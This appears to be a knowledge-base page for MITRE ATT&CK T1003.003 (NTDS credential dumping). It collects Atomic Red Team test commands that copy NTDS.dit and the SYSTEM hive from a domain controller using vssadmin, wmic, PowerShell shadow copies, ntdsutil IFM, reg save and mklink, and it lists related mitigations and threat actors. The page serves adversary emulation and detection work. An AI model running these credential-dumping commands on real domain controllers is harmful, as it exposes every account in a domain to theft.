
# NTDS

## Description

### MITRE Description

> Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003/003

## Potential Commands

```
(gwmi -list win32_shadowcopy).Create(C:,'ClientAccessible')
mkdir C:\Windows\Temp\ntds_T1003
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
vssadmin.exe create shadow /for=C:
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy #{vsc_name}\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
wmic shadowcopy call create Volume=C:
vssadmin.exe create shadow /for=#{drive_letter}
mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

## Commands Dataset

```
[{'command': 'vssadmin.exe create shadow /for=C:\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'copy '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit '
             '#{extract_path}\\ntds.dit\n'
             'copy '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM '
             '#{extract_path}\\VSC_SYSTEM_HIVE\n'
             'reg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit '
             'C:\\Windows\\Temp\\ntds.dit\n'
             'copy #{vsc_name}\\Windows\\System32\\config\\SYSTEM '
             'C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\n'
             'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'mkdir C:\\Windows\\Temp\\ntds_T1003\n'
             'ntdsutil "ac i ntds" "ifm" "create full '
             'C:\\Windows\\Temp\\ntds_T1003" q q\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'wmic shadowcopy call create Volume=C:\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': "(gwmi -list win32_shadowcopy).Create(C:,'ClientAccessible')\n",
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'vssadmin.exe create shadow /for=C:\n'
             'mklink /D #{symlink_path} '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'},
 {'command': 'vssadmin.exe create shadow /for=#{drive_letter}\n'
             'mklink /D C:\\Temp\\vssstore '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n',
  'name': None,
  'source': 'atomics/T1003.003/T1003.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - OS Credential Dumping: NTDS': {'atomic_tests': [{'auto_generated_guid': 'dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f',
                                                                           'dependencies': [{'description': 'Target '
                                                                                                            'must '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            'Domain '
                                                                                                            'Controller\n',
                                                                                             'get_prereq_command': 'echo '
                                                                                                                   'Sorry, '
                                                                                                                   'Promoting '
                                                                                                                   'this '
                                                                                                                   'machine '
                                                                                                                   'to '
                                                                                                                   'a '
                                                                                                                   'Domain '
                                                                                                                   'Controller '
                                                                                                                   'must '
                                                                                                                   'be '
                                                                                                                   'done '
                                                                                                                   'manually\n',
                                                                                             'prereq_command': 'reg '
                                                                                                               'query '
                                                                                                               'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                               '/v '
                                                                                                               'ProductType '
                                                                                                               '| '
                                                                                                               'findstr '
                                                                                                               'LanmanNT\n'}],
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'by '
                                                                                          'copying '
                                                                                          'it '
                                                                                          'from '
                                                                                          'a '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy.\n',
                                                                           'executor': {'command': 'vssadmin.exe '
                                                                                                   'create '
                                                                                                   'shadow '
                                                                                                   '/for=#{drive_letter}\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'drive_letter': {'default': 'C:',
                                                                                                                'description': 'Drive '
                                                                                                                               'letter '
                                                                                                                               'to '
                                                                                                                               'source '
                                                                                                                               'VSC '
                                                                                                                               '(including '
                                                                                                                               'colon)',
                                                                                                                'type': 'String'}},
                                                                           'name': 'Create '
                                                                                   'Volume '
                                                                                   'Shadow '
                                                                                   'Copy '
                                                                                   'with '
                                                                                   'NTDS.dit',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': 'c6237146-9ea6-4711-85c9-c56d263a6b03',
                                                                           'dependencies': [{'description': 'Target '
                                                                                                            'must '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            'Domain '
                                                                                                            'Controller\n',
                                                                                             'get_prereq_command': 'echo '
                                                                                                                   'Sorry, '
                                                                                                                   'Promoting '
                                                                                                                   'this '
                                                                                                                   'machine '
                                                                                                                   'to '
                                                                                                                   'a '
                                                                                                                   'Domain '
                                                                                                                   'Controller '
                                                                                                                   'must '
                                                                                                                   'be '
                                                                                                                   'done '
                                                                                                                   'manually\n',
                                                                                             'prereq_command': 'reg '
                                                                                                               'query '
                                                                                                               'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                               '/v '
                                                                                                               'ProductType '
                                                                                                               '| '
                                                                                                               'findstr '
                                                                                                               'LanmanNT\n'},
                                                                                            {'description': 'Volume '
                                                                                                            'shadow '
                                                                                                            'copy '
                                                                                                            'must '
                                                                                                            'exist\n',
                                                                                             'get_prereq_command': 'echo '
                                                                                                                   'Run '
                                                                                                                   '"Invoke-AtomicTest '
                                                                                                                   'T1003.003 '
                                                                                                                   '-TestName '
                                                                                                                   "'Create "
                                                                                                                   'Volume '
                                                                                                                   'Shadow '
                                                                                                                   'Copy '
                                                                                                                   'with '
                                                                                                                   'NTDS.dit\'" '
                                                                                                                   'to '
                                                                                                                   'fulfuill '
                                                                                                                   'this '
                                                                                                                   'requirement\n',
                                                                                             'prereq_command': 'if '
                                                                                                               'not '
                                                                                                               'exist '
                                                                                                               '#{vsc_name} '
                                                                                                               '(exit '
                                                                                                               '/b '
                                                                                                               '1)\n'},
                                                                                            {'description': 'Extract '
                                                                                                            'path '
                                                                                                            'must '
                                                                                                            'exist\n',
                                                                                             'get_prereq_command': 'mkdir '
                                                                                                                   '#{extract_path}\n',
                                                                                             'prereq_command': 'if '
                                                                                                               'not '
                                                                                                               'exist '
                                                                                                               '#{extract_path} '
                                                                                                               '(exit '
                                                                                                               '/b '
                                                                                                               '1)\n'}],
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'by '
                                                                                          'copying '
                                                                                          'it '
                                                                                          'from '
                                                                                          'a '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy.\n'
                                                                                          '\n'
                                                                                          'This '
                                                                                          'test '
                                                                                          'requires '
                                                                                          'steps '
                                                                                          'taken '
                                                                                          'in '
                                                                                          'the '
                                                                                          'test '
                                                                                          '"Create '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy '
                                                                                          'with '
                                                                                          'NTDS.dit".\n'
                                                                                          'A '
                                                                                          'successful '
                                                                                          'test '
                                                                                          'also '
                                                                                          'requires '
                                                                                          'the '
                                                                                          'export '
                                                                                          'of '
                                                                                          'the '
                                                                                          'SYSTEM '
                                                                                          'Registry '
                                                                                          'hive.\n'
                                                                                          'This '
                                                                                          'test '
                                                                                          'must '
                                                                                          'be '
                                                                                          'executed '
                                                                                          'on '
                                                                                          'a '
                                                                                          'Windows '
                                                                                          'Domain '
                                                                                          'Controller.\n',
                                                                           'executor': {'cleanup_command': 'del '
                                                                                                           '"#{extract_path}\\ntds.dit"        '
                                                                                                           '>nul '
                                                                                                           '2> '
                                                                                                           'nul\n'
                                                                                                           'del '
                                                                                                           '"#{extract_path}\\VSC_SYSTEM_HIVE" '
                                                                                                           '>nul '
                                                                                                           '2> '
                                                                                                           'nul\n'
                                                                                                           'del '
                                                                                                           '"#{extract_path}\\SYSTEM_HIVE"     '
                                                                                                           '>nul '
                                                                                                           '2> '
                                                                                                           'nul\n',
                                                                                        'command': 'copy '
                                                                                                   '#{vsc_name}\\Windows\\NTDS\\NTDS.dit '
                                                                                                   '#{extract_path}\\ntds.dit\n'
                                                                                                   'copy '
                                                                                                   '#{vsc_name}\\Windows\\System32\\config\\SYSTEM '
                                                                                                   '#{extract_path}\\VSC_SYSTEM_HIVE\n'
                                                                                                   'reg '
                                                                                                   'save '
                                                                                                   'HKLM\\SYSTEM '
                                                                                                   '#{extract_path}\\SYSTEM_HIVE\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'extract_path': {'default': 'C:\\Windows\\Temp',
                                                                                                                'description': 'Path '
                                                                                                                               'for '
                                                                                                                               'extracted '
                                                                                                                               'NTDS.dit',
                                                                                                                'type': 'Path'},
                                                                                               'vsc_name': {'default': '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
                                                                                                            'description': 'Name '
                                                                                                                           'of '
                                                                                                                           'Volume '
                                                                                                                           'Shadow '
                                                                                                                           'Copy',
                                                                                                            'type': 'String'}},
                                                                           'name': 'Copy '
                                                                                   'NTDS.dit '
                                                                                   'from '
                                                                                   'Volume '
                                                                                   'Shadow '
                                                                                   'Copy',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': '2364e33d-ceab-4641-8468-bfb1d7cc2723',
                                                                           'dependencies': [{'description': 'Target '
                                                                                                            'must '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            'Domain '
                                                                                                            'Controller\n',
                                                                                             'get_prereq_command': 'echo '
                                                                                                                   'Sorry, '
                                                                                                                   'Promoting '
                                                                                                                   'this '
                                                                                                                   'machine '
                                                                                                                   'to '
                                                                                                                   'a '
                                                                                                                   'Domain '
                                                                                                                   'Controller '
                                                                                                                   'must '
                                                                                                                   'be '
                                                                                                                   'done '
                                                                                                                   'manually\n',
                                                                                             'prereq_command': 'reg '
                                                                                                               'query '
                                                                                                               'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                               '/v '
                                                                                                               'ProductType '
                                                                                                               '| '
                                                                                                               'findstr '
                                                                                                               'LanmanNT\n'}],
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'using '
                                                                                          'NTDSUtil '
                                                                                          'for '
                                                                                          'offline '
                                                                                          'credential '
                                                                                          'theft '
                                                                                          'attacks. '
                                                                                          'This '
                                                                                          'capability\n'
                                                                                          'uses '
                                                                                          'the '
                                                                                          '"IFM" '
                                                                                          'or '
                                                                                          '"Install '
                                                                                          'From '
                                                                                          'Media" '
                                                                                          'backup '
                                                                                          'functionality '
                                                                                          'that '
                                                                                          'allows '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'restoration '
                                                                                          'or '
                                                                                          'installation '
                                                                                          'of\n'
                                                                                          'subsequent '
                                                                                          'domain '
                                                                                          'controllers '
                                                                                          'without '
                                                                                          'the '
                                                                                          'need '
                                                                                          'of '
                                                                                          'network-based '
                                                                                          'replication.\n'
                                                                                          '\n'
                                                                                          'Upon '
                                                                                          'successful '
                                                                                          'completion, '
                                                                                          'you '
                                                                                          'will '
                                                                                          'find '
                                                                                          'a '
                                                                                          'copy '
                                                                                          'of '
                                                                                          'the '
                                                                                          'ntds.dit '
                                                                                          'file '
                                                                                          'in '
                                                                                          'the '
                                                                                          'C:\\Windows\\Temp '
                                                                                          'directory.\n',
                                                                           'executor': {'cleanup_command': 'rmdir '
                                                                                                           '/q '
                                                                                                           '/s '
                                                                                                           '#{output_folder} '
                                                                                                           '>nul '
                                                                                                           '2>&1\n',
                                                                                        'command': 'mkdir '
                                                                                                   '#{output_folder}\n'
                                                                                                   'ntdsutil '
                                                                                                   '"ac '
                                                                                                   'i '
                                                                                                   'ntds" '
                                                                                                   '"ifm" '
                                                                                                   '"create '
                                                                                                   'full '
                                                                                                   '#{output_folder}" '
                                                                                                   'q '
                                                                                                   'q\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'output_folder': {'default': 'C:\\Windows\\Temp\\ntds_T1003',
                                                                                                                 'description': 'Path '
                                                                                                                                'where '
                                                                                                                                'resulting '
                                                                                                                                'dump '
                                                                                                                                'should '
                                                                                                                                'be '
                                                                                                                                'placed',
                                                                                                                 'type': 'Path'}},
                                                                           'name': 'Dump '
                                                                                   'Active '
                                                                                   'Directory '
                                                                                   'Database '
                                                                                   'with '
                                                                                   'NTDSUtil',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': '224f7de0-8f0a-4a94-b5d8-989b036c86da',
                                                                           'dependencies': [{'description': 'Target '
                                                                                                            'must '
                                                                                                            'be '
                                                                                                            'a '
                                                                                                            'Domain '
                                                                                                            'Controller\n',
                                                                                             'get_prereq_command': 'echo '
                                                                                                                   'Sorry, '
                                                                                                                   'Promoting '
                                                                                                                   'this '
                                                                                                                   'machine '
                                                                                                                   'to '
                                                                                                                   'a '
                                                                                                                   'Domain '
                                                                                                                   'Controller '
                                                                                                                   'must '
                                                                                                                   'be '
                                                                                                                   'done '
                                                                                                                   'manually\n',
                                                                                             'prereq_command': 'reg '
                                                                                                               'query '
                                                                                                               'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                               '/v '
                                                                                                               'ProductType '
                                                                                                               '| '
                                                                                                               'findstr '
                                                                                                               'LanmanNT\n'}],
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'by '
                                                                                          'copying '
                                                                                          'it '
                                                                                          'from '
                                                                                          'a '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy.\n',
                                                                           'executor': {'command': 'wmic '
                                                                                                   'shadowcopy '
                                                                                                   'call '
                                                                                                   'create '
                                                                                                   'Volume=#{drive_letter}\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'drive_letter': {'default': 'C:',
                                                                                                                'description': 'Drive '
                                                                                                                               'letter '
                                                                                                                               'to '
                                                                                                                               'source '
                                                                                                                               'VSC '
                                                                                                                               '(including '
                                                                                                                               'colon)',
                                                                                                                'type': 'String'}},
                                                                           'name': 'Create '
                                                                                   'Volume '
                                                                                   'Shadow '
                                                                                   'Copy '
                                                                                   'with '
                                                                                   'WMI',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': '542bb97e-da53-436b-8e43-e0a7d31a6c24',
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'by '
                                                                                          'copying '
                                                                                          'it '
                                                                                          'from '
                                                                                          'a '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy.\n',
                                                                           'executor': {'command': '(gwmi '
                                                                                                   '-list '
                                                                                                   "win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')\n",
                                                                                        'elevation_required': True,
                                                                                        'name': 'powershell'},
                                                                           'input_arguments': {'drive_letter': {'default': 'C:',
                                                                                                                'description': 'Drive '
                                                                                                                               'letter '
                                                                                                                               'to '
                                                                                                                               'source '
                                                                                                                               'VSC '
                                                                                                                               '(including '
                                                                                                                               'colon)',
                                                                                                                'type': 'String'}},
                                                                           'name': 'Create '
                                                                                   'Volume '
                                                                                   'Shadow '
                                                                                   'Copy '
                                                                                   'with '
                                                                                   'Powershell',
                                                                           'supported_platforms': ['windows']},
                                                                          {'auto_generated_guid': '21748c28-2793-4284-9e07-d6d028b66702',
                                                                           'description': 'This '
                                                                                          'test '
                                                                                          'is '
                                                                                          'intended '
                                                                                          'to '
                                                                                          'be '
                                                                                          'run '
                                                                                          'on '
                                                                                          'a '
                                                                                          'domain '
                                                                                          'Controller.\n'
                                                                                          '\n'
                                                                                          'The '
                                                                                          'Active '
                                                                                          'Directory '
                                                                                          'database '
                                                                                          'NTDS.dit '
                                                                                          'may '
                                                                                          'be '
                                                                                          'dumped '
                                                                                          'by '
                                                                                          'creating '
                                                                                          'a '
                                                                                          'symlink '
                                                                                          'to '
                                                                                          'Volume '
                                                                                          'Shadow '
                                                                                          'Copy.\n',
                                                                           'executor': {'command': 'vssadmin.exe '
                                                                                                   'create '
                                                                                                   'shadow '
                                                                                                   '/for=#{drive_letter}\n'
                                                                                                   'mklink '
                                                                                                   '/D '
                                                                                                   '#{symlink_path} '
                                                                                                   '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'drive_letter': {'default': 'C:',
                                                                                                                'description': 'Drive '
                                                                                                                               'letter '
                                                                                                                               'to '
                                                                                                                               'source '
                                                                                                                               'VSC '
                                                                                                                               '(including '
                                                                                                                               'colon)',
                                                                                                                'type': 'String'},
                                                                                               'symlink_path': {'default': 'C:\\Temp\\vssstore',
                                                                                                                'description': 'symlink '
                                                                                                                               'path',
                                                                                                                'type': 'String'}},
                                                                           'name': 'Create '
                                                                                   'Symlink '
                                                                                   'to '
                                                                                   'Volume '
                                                                                   'Shadow '
                                                                                   'Copy',
                                                                           'supported_platforms': ['windows']}],
                                                         'attack_technique': 'T1003.003',
                                                         'display_name': 'OS '
                                                                         'Credential '
                                                                         'Dumping: '
                                                                         'NTDS'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [User Training](../mitigations/User-Training.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    
* [Encrypt Sensitive Information](../mitigations/Encrypt-Sensitive-Information.md)
    

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [FIN6](../actors/FIN6.md)
    
